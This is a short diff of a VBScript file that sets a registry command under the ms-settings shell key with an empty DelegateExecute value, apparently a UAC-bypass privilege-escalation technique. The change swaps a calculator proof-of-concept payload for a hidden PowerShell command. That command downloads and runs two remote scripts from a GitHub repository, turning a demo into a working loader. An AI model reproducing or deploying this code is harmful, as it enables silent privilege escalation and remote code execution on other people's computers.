@@ -6,7 +6,7 @@ Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
 Const DelegateExecRegKeyName = "DelegateExecute"
 Const DelegateExecRegKeyValue = ""
 Const DefaultRegKeyName = ""
-Const DefaultRegKeyValue = "powershell -w 1 -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/arntsonl/calc_security_poc/master/ps1/calc.ps1')"
+Const DefaultRegKeyValue = "powershell -w 1 -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/R1.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/RC.ps1')"
 
 Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
 Set Registry = GetObject(RegObjectPath)
